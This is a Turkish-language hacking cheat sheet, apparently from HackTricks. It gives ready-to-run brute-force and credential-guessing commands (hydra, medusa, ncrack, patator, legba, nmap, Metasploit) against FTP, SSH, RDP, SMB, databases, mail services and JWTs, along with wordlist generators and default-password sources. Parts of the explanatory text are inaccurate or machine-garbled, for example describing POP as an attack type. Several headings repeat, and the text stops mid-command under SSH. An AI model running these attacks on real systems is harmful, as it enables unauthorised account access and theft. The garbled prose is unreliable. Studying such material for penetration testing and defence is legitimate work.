# Brute Force - Kopya Kağıdı

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçlarıyla desteklenen **otomatik iş akışları** oluşturun ve otomatikleştirin.\
Bugün Erişim Edinin:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Sıfırdan kahramana kadar AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## Varsayılan Kimlik Bilgileri

Kullanılan teknolojinin varsayılan kimlik bilgilerini aramak için google'da arama yapın veya **bu bağlantıları deneyin**:

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)
* [**https://theinfocentric.com/**](https://theinfocentric.com/) 

## **Kendi Sözlüklerinizi Oluşturun**

Hedefle ilgili mümkün olduğunca fazla bilgi bulun ve özel bir sözlük oluşturun. Yardımcı olabilecek araçlar:

### Crunch
```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```
### Cewl

Cewl, bir web sitesinden metin çıkarmak için kullanılan bir araçtır. Bu araç, web sitesindeki metinleri analiz eder ve belirli kelimeleri veya cümleleri çıkararak bir kelime listesi oluşturur. Bu liste daha sonra şifre kırma saldırılarında veya sosyal mühendislik saldırılarında kullanılabilir. Cewl, genellikle hedef web sitesinin içeriğini anlamak ve hedefe yönelik özel bir saldırı planlamak için kullanılır.
```bash
cewl example.com -m 5 -w words.txt
```
### [CUPP](https://github.com/Mebus/cupp)

Kurban hakkındaki bilgilerinize dayanarak şifreler oluşturun (isimler, tarihler...)
```
python3 cupp.py -h
```
### [Wister](https://github.com/cycurity/wister)

Belirli bir hedefle ilgili kullanmak için benzersiz ve ideal bir kelime listesi oluşturmanıza olanak tanıyan bir kelime listesi oluşturma aracıdır.
```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

__          _______  _____ _______ ______ _____
\ \        / /_   _|/ ____|__   __|  ____|  __ \
\ \  /\  / /  | | | (___    | |  | |__  | |__) |
\ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
\  /\  /   _| |_ ____) |  | |  | |____| | \ \
\/  \/   |_____|_____/   |_|  |______|_|  \_\

Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```
### [pydictor](https://github.com/LandGrey/pydictor)

### Kelime Listeleri

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçlarıyla desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Hizmetler

Hizmet adına göre alfabetik olarak sıralanmıştır.

### AFP
```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```
### AJP

AJP, or Apache JServ Protocol, is a binary protocol that can be brute-forced to gain unauthorized access to Apache Tomcat servers. It is important to note that brute-forcing AJP can lead to account lockouts or other security measures being triggered, so it should be approached with caution.
```bash
nmap --script ajp-brute -p 8009 <IP>
```
## AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM ve Solace)
```bash
legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
```
### Cassandra

Cassandra, Apache Software Foundation tarafından geliştirilen ve dağıtılan bir NoSQL veritabanı yönetim sistemidir. Cassandra, yüksek performanslı, yüksek ölçeklenebilir ve yüksek kullanılabilirlik sunan dağıtık bir veritabanı çözümüdür. Apache Cassandra'nın güvenliğini artırmak için, güçlü ve benzersiz şifreler kullanarak veritabanı erişimini korumak önemlidir. Ayrıca, güvenlik duvarları ve erişim kontrolleri gibi ek önlemler almak da önerilir.
```bash
nmap --script cassandra-brute -p 9160 <IP>
# legba ScyllaDB / Apache Casandra
legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
```
### CouchDB

Brute-force attacks against CouchDB are relatively simple to execute. The most common method is to use a tool like Hydra to repeatedly attempt to log in using different username and password combinations. This can be effective if the database is not properly secured with strong credentials.
```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```
### Docker Registry

Docker Registry, Docker görüntülerini depolamak ve dağıtmak için kullanılan bir depolama ve dağıtım sistemidir. Docker Registry, Docker Hub gibi genel bir hizmet olarak kullanılabileceği gibi, kendi özel Docker Registry'nizi çalıştırabilirsiniz. Docker Registry, Docker görüntülerini depolamak ve paylaşmak için kullanılan bir merkezi depolama alanıdır.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```
### Elasticsearch

Elasticsearch, bir açık kaynaklı arama ve analiz motorudur. Elasticsearch, RESTful API'leri kullanarak JSON belgeleri üzerinde arama yapmak için kullanılır. Elasticsearch, büyük miktarda veri depolamak ve hızlı bir şekilde aramak için optimize edilmiştir. Ayrıca, çeşitli veri analizi ve görselleştirme araçlarıyla entegre edilebilir. Elasticsearch, genellikle log yönetimi, gerçek zamanlı analiz ve tam metin arama gibi senaryolarda kullanılır.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```
### FTP

FTP, File Transfer Protocol anlamına gelir. Bir hedefin FTP sunucusuna erişmek için brute force saldırıları kullanılabilir. Bu saldırılar, genellikle kullanıcı adı ve şifre kombinasyonlarını deneyerek hedefin FTP sunucusuna erişmeye çalışır. Bu saldırılar için yaygın araçlar arasında Hydra, Medusa ve Ncrack bulunmaktadır.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
```
### HTTP Genel Kaba Kuvvet

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### HTTP Temel Kimlik Doğrulama
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
```
### HTTP - NTLM
```bash
legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
```
### HTTP - Post Form

#### Brute Force

Brute force is a common attack method used to gain unauthorized access to a system by trying all possible combinations of usernames and passwords until the correct one is found. This method can be used to crack passwords, encryption keys, and other security mechanisms.

#### Brute Force Tools

There are several tools available for conducting brute force attacks, such as Hydra, Medusa, and Ncrack. These tools automate the process of trying different combinations of credentials to gain access to a system.

#### Brute Force Protection

To protect against brute force attacks, it is important to use strong and unique passwords, implement account lockout policies, and use multi-factor authentication. Additionally, monitoring login attempts and implementing rate limiting can help detect and prevent brute force attacks.
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```
### **HTTP - CMS --** (W)ordpress, (J)oomla veya (D)rupal veya (M)oodle

http**s** için "http-post-form"dan "**https-post-form"**'a değiştirmeniz gerekmektedir.
```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
# Check also https://github.com/evilsocket/legba/wiki/HTTP
```
### IMAP

IMAP (Internet Message Access Protocol) is a standard email protocol that stores email messages on a mail server. IMAP allows an email client to access email on the server as if they were stored locally.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
legba imap --username user --password data/passwords.txt --target localhost:993
```
### IRC

IRC, Internet Relay Chat, eski bir iletişim protokolüdür. Brute force saldırıları genellikle IRC sunucularına karşı kullanılır. Kullanıcı adı ve şifre kombinasyonlarını denemek için genellikle kullanılır. Bu tür saldırılar, oturum açma ekranlarında veya IRC sunucularına erişim sağlamak için kullanılan diğer arayüzlerde etkili olabilir.
```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```
### ISCSI

### ISCSI
```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```
### JWT

JWT, JSON Web Token, anlamına gelir. JWT'ler, verileri güvenli bir şekilde taşımak için kullanılan bir standarttır. JWT'ler, üç bölümden oluşur: başlık, yük ve imza. Başlık, JWT'nin türünü ve kullanılan algoritmayı belirtir. Yük, JWT'nin taşıdığı verileri içerir. İmza ise JWT'nin doğruluğunu doğrulamak için kullanılan bir değerdir. JWT'ler genellikle kimlik doğrulama ve yetkilendirme işlemlerinde kullanılır.
```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```
### LDAP

LDAP, Hafif Dizin Erişim Protokolü anlamına gelir. Bir saldırgan, LDAP sunucusuna erişmek için kaba kuvvet saldırısı yapabilir. Bu saldırı türü, kullanıcı adı ve şifre kombinasyonlarını deneyerek doğru kimlik bilgilerini bulmaya çalışır. Bu saldırı türü genellikle oturum açma sayfalarında veya kimlik doğrulama gerektiren diğer alanlarda kullanılır.
```bash
nmap --script ldap-brute -p 389 <IP>
legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
```
### MQTT

MQTT, Message Queuing Telemetry Transport, is a lightweight messaging protocol that is widely used in IoT devices for communication. MQTT operates on a publish/subscribe model, where clients can publish messages to a broker and subscribe to receive messages on specific topics. This protocol is known for its efficiency and low bandwidth usage, making it ideal for IoT applications.
```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
```
### Mongo

Mongo veritabanı sunucusuna brute force saldırısı yapmak için Hydra aracını kullanabilirsiniz. Aşağıdaki komutu kullanarak saldırıyı gerçekleştirebilirsiniz:

```plaintext
hydra -l <username> -P <wordlist> <ip_address> mongodb
```

- `<username>`: Hedef veritabanı sunucusunda denemek istediğiniz kullanıcı adı
- `<wordlist>`: Kullanılacak şifre listesi dosyasının yolu
- `<ip_address>`: Hedef veritabanı sunucusunun IP adresi
```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
legba mongodb --target localhost:27017 --username root --password data/passwords.txt
```
### MSSQL

#### Brute Force

Brute force is a common technique used to gain unauthorized access to MSSQL databases. Attackers use automated tools to systematically try all possible combinations of usernames and passwords until the correct one is found. This method can be time-consuming but is often successful if weak credentials are used. It is important to use strong, complex passwords and implement account lockout policies to protect against brute force attacks.
```bash
legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
```
### MySQL

#### Brute Force

Brute force is a common technique used to gain unauthorized access to a system by trying all possible combinations of usernames and passwords until the correct one is found. In the context of MySQL, brute force attacks can be used to crack the login credentials of MySQL databases.

#### Prevention

To prevent brute force attacks on MySQL databases, you can take the following measures:

1. **Strong Passwords**: Use complex and unique passwords for MySQL accounts to make it harder for attackers to guess them.
2. **Limit Login Attempts**: Implement mechanisms to limit the number of login attempts allowed within a certain time frame.
3. **Two-Factor Authentication**: Enable two-factor authentication for MySQL accounts to add an extra layer of security.
4. **Network Security**: Secure the network to prevent unauthorized access to the MySQL server.
5. **Regular Monitoring**: Monitor MySQL logs and server activity for any suspicious login attempts.

By implementing these preventive measures, you can significantly reduce the risk of unauthorized access to your MySQL databases through brute force attacks.
```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql

#Legba
legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
```
### OracleSQL

Brute force is a technique used to gain unauthorized access to a system by trying all possible combinations of usernames and passwords until the correct one is found. In the context of OracleSQL, brute force attacks can be used to crack passwords and gain access to Oracle databases. These attacks can be automated using tools like Hydra or Medusa, which can try thousands of combinations in a short amount of time. It is important to use strong, complex passwords and implement other security measures to protect against brute force attacks.
```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>

legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
```
**oracle_login**'ı **patator** ile kullanabilmek için **yükleme** yapmanız gerekmektedir:
```bash
pip3 install cx_Oracle --upgrade
```
[Çevrimdışı OracleSQL hash bruteforce](../network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**sürümler 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** ve **11.2.0.3**):
```bash
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```
### POP

POP, kullanıcı adı ve şifre kombinasyonlarını deneyerek bir hedefe erişmeye çalışan bir brute force saldırı türüdür. Bu saldırı türü genellikle zayıf şifrelerin veya kötü güvenlik uygulamalarının hedef alındığı durumlarda kullanılır.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V

# Insecure
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110

# SSL
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
```
### PostgreSQL

PostgreSQL, açık kaynaklı bir ilişkisel veritabanı yönetim sistemi (RDBMS) olup, genellikle web uygulamaları ve büyük veri depolama sistemlerinde kullanılmaktadır. PostgreSQL veritabanlarına brute force saldırıları genellikle kullanıcı adı ve şifre kombinasyonlarını deneyerek gerçekleştirilir. Bu saldırı türü, oturum açma sayfasına doğrudan erişim sağlayarak veya API aracılığıyla gerçekleştirilebilir. Saldırganlar, oturum açma sayfasına doğrudan erişim sağlamak için otomatik araçlar kullanabilir veya API'yi hedef alarak oturum açma isteklerini otomatikleştirebilirler. Bu tür saldırılar genellikle zayıf şifrelerin veya kötü yapılandırılmış erişim kontrollerinin sömürülmesiyle gerçekleştirilir. PostgreSQL veritabanlarınızı brute force saldırılarına karşı korumak için güçlü ve karmaşık şifreler kullanmanız, erişim kontrollerini düzgün bir şekilde yapılandırmanız ve güvenlik en iyi uygulamalarını takip etmeniz önemlidir.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
```
### PPTP

`.deb` paketini indirmek için [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/) adresine gidebilirsiniz.
```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```
### RDP

#### Brute Force

Brute force is a common method used to gain unauthorized access to RDP servers. Attackers use automated tools to try all possible username and password combinations until the correct one is found. This method can be effective if strong passwords are not used. It is important to use complex and unique passwords to protect RDP servers from brute force attacks.

#### Protection

To protect RDP servers from brute force attacks, it is recommended to:
- Use complex and unique passwords
- Implement account lockout policies
- Use multi-factor authentication
- Limit the number of login attempts
- Monitor RDP logs for suspicious activity
```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
```
### Redis

Redis, açık kaynaklı, in-memory veri yapısıyla çalışan bir veritabanı yönetim sistemidir. Redis sunucularına brute force saldırıları, genellikle zayıf şifreler veya güvenlik açıklarından kaynaklanan saldırılardır. Bu tür saldırılar, oturum açma sayısını artırarak veya şifre kombinasyonlarını deneyerek Redis sunucusuna yetkisiz erişim sağlamayı amaçlar. Bu tür saldırılara karşı korunmak için güçlü ve karmaşık şifreler kullanılmalı ve güvenlik en iyi uygulamaları takip edilmelidir.
```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
```
### Rexec

Rexec, kaba kuvvet saldırıları için kullanılan bir protokol ve servistir. Rexec, kullanıcı kimlik doğrulaması için standart UNIX kimlik doğrulama protokolünü kullanır. Bu protokol, kullanıcı adı ve şifre gibi kimlik bilgilerini doğrulamak için kullanılır.
```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```
### Rlogin

Rlogin, Remote Login, is a service that allows users to log in to a remote system over a network. It is a protocol that transmits login information in plain text, making it vulnerable to interception. Brute force attacks can be used to guess passwords and gain unauthorized access to remote systems.
```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```
### Rsh

Rsh, Remote Shell, is a simple remote shell client included in most Unix-like operating systems. It can be used to execute commands on a remote system. Rsh is often used in brute force attacks to guess passwords.
```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```
[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

### Rsync

Brute force attack using Rsync.
```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```
### RTSP

### RTSP
```bash
hydra -l root -P passwords.txt <IP> rtsp
```
### SFTP

SFTP, **SSH File Transfer Protocol**'ün kısaltmasıdır. SFTP, dosya transferi için güvenli bir protokoldür. Saldırganlar, zayıf şifreler veya zayıf kimlik doğrulama yöntemleri kullanarak SFTP sunucularına erişmeye çalışabilir. Brute force saldırıları, saldırganların SFTP sunucularına erişmek için denemeler yaparak şifreleri kırma yöntemidir. Güçlü ve karmaşık şifreler kullanarak SFTP sunucularını brute force saldırılarına karşı koruyabilirsiniz.
```bash
legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
### SNMP

SNMP, yani Basit Ağ Yönetim Protokolü, ağ cihazlarını izlemek, yönetmek ve bilgi toplamak için kullanılan bir protokoldür. SNMP brute force saldırıları, genellikle varsayılan topluluk dizesi gibi zayıf kimlik doğrulama bilgilerini kullanarak SNMP hizmetine erişmeye çalışır. Bu saldırılar, ağ cihazlarına yetkisiz erişim sağlayabilir ve ağ güvenliğini tehlikeye atabilir.
```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```
### SMB

### SMB

SMB, **Server Message Block**, is a network protocol used for sharing files, printers, and other resources on a network. It operates over TCP ports 139 and 445. 

### SMB

SMB, **Sunucu İleti Bloğu**, bir ağ protokolüdür ve ağ üzerinde dosyaları, yazıcıları ve diğer kaynakları paylaşmak için kullanılır. TCP bağlantı noktaları 139 ve 445 üzerinden çalışır.
```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
```
### SMTP

Simple Mail Transfer Protocol (Basit Posta Aktarım Protokolü) olarak bilinen SMTP, e-posta iletilerinin iletilmesi için kullanılan standart bir ileti aktarım protokolüdür.
```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
```
### SOCKS

SOCKS, yani "Socket Secure", ağ üzerinde güvenli bir şekilde dolaşmanıza olanak tanıyan bir protokoldür. SOCKS sunucuları, ağ trafiğini yönlendirmek için kullanılabilir ve genellikle proxy hizmetleri için tercih edilir. Bu protokol, IP adresinizi gizleyerek ve kimlik doğrulama sağlayarak anonimliği artırabilir.
```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
# With alternative address
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
```
### SQL Server

SQL Server, Microsoft'un ilişkisel veritabanı yönetim sistemidir. SQL Server veritabanlarına brute force saldırıları genellikle SQL Injection saldırılarıyla birlikte gerçekleştirilir. Brute force saldırıları, genellikle zayıf veya tahmin edilebilir parolaları deneyerek SQL Server veritabanına yetkisiz erişim elde etmeyi amaçlar. Bu tür saldırılar genellikle otomatik araçlar kullanılarak gerçekleştirilir ve güvenlik açıklarını tespit etmek için kullanılır.
```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```
### SSH

SSH, Secure Shell'in kısaltmasıdır. SSH brute force saldırıları, genellikle şifre deneme saldırıları kullanılarak gerçekleştirilir. Saldırganlar, SSH sunucusuna erişmek için farklı şifre kombinasyonlarını deneyerek giriş yapmaya çalışırlar. Bu saldırı türü, güvenlik duvarı ve diğer güvenlik önlemleri tarafından tespit edilmesi zor olabilir, bu nedenle saldırganlar için popüler bir seçenektir. Saldırganlar genellikle otomatik araçlar kullanarak büyük bir şifre listesini hızla deneyerek başarılı bir giriş elde etmeye çalışırlar. Bu tür saldırılara karşı koymak için güçlü ve benzersiz şifreler kullanılmalı ve giriş denemelerini sınırlamak için gerekli önlemler alınmalıdır.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
